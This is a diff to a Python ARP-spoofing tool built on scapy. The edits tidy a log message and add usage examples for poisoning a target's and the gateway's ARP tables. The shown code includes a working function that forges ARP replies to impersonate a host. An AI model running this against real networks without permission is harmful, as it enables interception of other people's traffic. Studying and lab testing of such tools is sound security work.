@@ -12,6 +12,7 @@ import argparse
 import netifaces
 from scapy.all import *
 from getmac import get_mac_address as gma
+import sys
 import defaults
 
 
@@ -59,7 +60,9 @@ def get_gw_ip(iface):
 
 
 def send_is_at(iface, target, dst_mac, my_mac, ip):
-    print('sending \'is_at\' to ' + target + ' (mac: ' + dst_mac + '), that will convince him that the mac of ' + ip + ' is my mac (' + my_mac + ')...')
+    msg = f'sending \'is_at\' to {target} (mac: {dst_mac})'
+    msg += f'that will convince him that the mac of {ip} is our mac ({my_mac})'
+    print(msg)
     packet = Ether(dst=dst_mac, src=my_mac) / ARP(op=2, hwsrc=my_mac, psrc=ip, hwdst=dst_mac, pdst=target)
     sendp(packet, iface=iface)
 
@@ -71,9 +74,18 @@ def get_mac_by_ip(dst_ip):
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='Spoof ARP tables')
+    filename = sys.argv[0].split('\\')[-1].split('/')[-1]
+    example_text = f'''Example:
+ for making 10.0.0.12 think we are the gateway:
+     python {filename} -t 10.0.0.12
+ for making 10.0.0.12 think we are the gateway, and the the gateway think we are 10.0.0.12:
+     python {filename} -t 10.0.0.12 -gw
+'''
+    parser = argparse.ArgumentParser(description='Spoof ARP tables',
+                                     epilog=example_text,
+                                     formatter_class=argparse.RawDescriptionHelpFormatter)
     parser.add_argument('-i', '--iface', type=str, help='Interface you wish to use')
-    parser.add_argument('-s', '--src', type=str, help='The address you want for the attacker')        
+    parser.add_argument('-s', '--src', type=str, help='The address you want for the attacker')
     parser.add_argument('-d', '--delay', type=int, help='Delay (in seconds) between messages')
     parser.add_argument('-gw', help='should GW be attacked as well?', action='store_true')
     parser.add_argument('-t', '--target', type=str, help='IP of target', required=True)
